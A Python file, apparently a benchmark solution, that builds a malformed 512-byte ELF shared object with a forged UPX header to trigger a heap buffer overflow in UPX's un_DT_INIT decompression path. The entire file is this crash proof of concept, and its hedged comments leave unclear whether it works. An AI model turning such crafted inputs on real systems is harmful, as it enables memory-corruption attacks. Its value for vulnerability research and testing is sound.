import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in UPX.
        
        The vulnerability is in the de-compression of ELF shared libraries, specifically
        in PackLinuxElf::un_DT_INIT handling 'ph.method' and 'lowmem'.
        
        We construct a 512-byte ELF ET_DYN file with a crafted UPX footer (PackHeader).
        """
        # Ground-truth PoC length is 512 bytes.
        size = 512
        data = bytearray(size)
        
        # --- 1. ELF Header (32-bit, Little Endian, ET_DYN) ---
        # e_ident: Magic \x7fELF, 32-bit (1), LE (1), Version (1), ABI (0)
        struct.pack_into('<4sBBBBB', data, 0, b'\x7fELF', 1, 1, 1, 0, 0)
        # e_type: ET_DYN (3)
        struct.pack_into('<H', data, 16, 3)
        # e_machine: EM_386 (3)
        struct.pack_into('<H', data, 18, 3)
        # e_version: 1
        struct.pack_into('<I', data, 20, 1)
        # e_entry: 0x8048000
        struct.pack_into('<I', data, 24, 0x8048000)
        # e_phoff: 52 (immediately after header)
        struct.pack_into('<I', data, 28, 52)
        # e_shoff: 0
        struct.pack_into('<I', data, 32, 0)
        # e_flags: 0
        struct.pack_into('<I', data, 36, 0)
        # e_ehsize: 52
        struct.pack_into('<H', data, 40, 52)
        # e_phentsize: 32 (standard for 32-bit)
        struct.pack_into('<H', data, 42, 32)
        # e_phnum: 2 (LOAD + DYNAMIC)
        struct.pack_into('<H', data, 44, 2)
        # e_shentsize: 40
        struct.pack_into('<H', data, 46, 40)
        # e_shnum: 0
        struct.pack_into('<H', data, 48, 0)
        # e_shstrndx: 0
        struct.pack_into('<H', data, 50, 0)
        
        # --- 2. Program Headers (Start at 52) ---
        ph_off = 52
        
        # PH[0]: PT_LOAD
        # Maps the file into memory.
        # p_type (1), p_offset (0), p_vaddr, p_paddr, p_filesz, p_memsz, p_flags, p_align
        struct.pack_into('<IIIIIIII', data, ph_off, 
                         1, 0, 0x8048000, 0x8048000, size, size, 7, 0x1000)
        
        # PH[1]: PT_DYNAMIC
        # This segment contains the DT_INIT tag which un_DT_INIT processes.
        ph_off += 32
        dyn_vaddr = 0x8048000 + 256
        struct.pack_into('<IIIIIIII', data, ph_off,
                         2, 256, dyn_vaddr, dyn_vaddr, 64, 64, 6, 4)
                         
        # --- 3. Dynamic Section (Start at 256) ---
        dyn_off = 256
        # DT_INIT (12)
        struct.pack_into('<II', data, dyn_off, 12, 0x8048100)
        # DT_NULL (0)
        struct.pack_into('<II', data, dyn_off+8, 0, 0)
        
        # --- 4. UPX Footer / PackHeader ---
        # UPX expects the PackHeader near the end of the file.
        # Standard footer location for detection is usually End - 36 bytes.
        footer_off = size - 36
        
        # PackHeader Structure (32 bytes):
        # 0: Magic (4) "UPX!"
        # 4: Version (1)
        # 5: Format (1)
        # 6: Method (1) -> improper resetting logic relates to this field
        # 7: Level (1)
        # ...
        
        # Magic "UPX!"
        data[footer_off : footer_off+4] = b'UPX!'
        # Version
        data[footer_off+4] = 13
        # Format
        data[footer_off+5] = 0
        # Method: 8 (NRV2B) - a standard method that might use filters.
        data[footer_off+6] = 8
        # Level
        data[footer_off+7] = 9
        
        # U_Len (Uncompressed) - Large to trigger buffer calculations/allocations
        struct.pack_into('<I', data, footer_off+16, 0x1000)
        # C_Len (Compressed) - Small, potentially inconsistent with U_Len
        struct.pack_into('<I', data, footer_off+20, 128)
        
        # Filter byte (offset 28): Set to 0x26 to hint at filter usage corresponding to DT_INIT
        data[footer_off+28] = 0x26

        return bytes(data)